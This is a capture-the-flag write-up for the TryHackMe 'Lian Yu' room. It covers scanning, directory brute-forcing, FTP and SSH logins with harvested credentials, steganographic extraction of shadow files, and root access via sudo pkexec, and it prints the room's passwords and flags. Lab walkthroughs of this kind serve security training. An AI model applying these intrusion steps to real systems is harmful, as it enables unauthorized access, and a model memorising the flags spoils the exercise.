# Lian Yu Walkthrough (TryHackMe)

## Recon

Start by scanning the target to identify open services:

```bash
nmap -sC -sV 10.49.152.100
```

Based on the scan results (page 1):

* 21/tcp → FTP
* 22/tcp → SSH
* 80/tcp → HTTP

The web server (Apache) on port 80 is the main entry point.

---

## Enumeration

Perform directory brute-forcing:

```bash
gobuster dir -u http://10.49.152.100/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

Discovered:

* `/island/`

Inside the page (page 2), a code word is revealed:

```
vigilante
```

Continue enumeration:

```bash
gobuster dir -u http://10.49.152.100/island -w ...
```

Discovered:

* `/2100/`

Inside `/2100/`, a file is found:

* `green_arrow.ticket`

Content:

```
RTy8yhBQdscX
```

After decoding:

```
!#th3h00d
```

---

## Exploit

Use the discovered credentials to access FTP (page 6):

```bash
ftp 10.49.152.100
```

Login:

* Username: vigilante
* Password: !#th3h00d

Download files:

* Leave_me_alone.png
* Queen's_Gambit.png
* aa.jpg

---

## Post Exploitation (Steganography)

Analyze the downloaded images:

1. `Leave_me_alone.png`

   * Contains a hidden hint: **password** (page 8)

2. `aa.jpg`

   * Extract hidden data:

```bash
steghide extract -sf aa.jpg
```

Extracted:

* `ss.zip`

Unzip the archive:

```bash
unzip ss.zip
```

Files obtained:

* `passwd.txt`
* `shadow`

Inside `shadow`, the password is found:

```
M3tahuman
```

---

## SSH Access

Use the discovered credentials to log in via SSH (page 10):

```bash
ssh slade@10.49.152.100
```

Password:

```
M3tahuman
```

Successful shell access.

User flag:

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

---

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output shows:

```
(root) /usr/bin/pkexec
```

Exploit it:

```bash
sudo pkexec /bin/sh
```

Root shell obtained.

Retrieve the root flag:

```bash
cat /root/root.txt
```

Root flag:

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

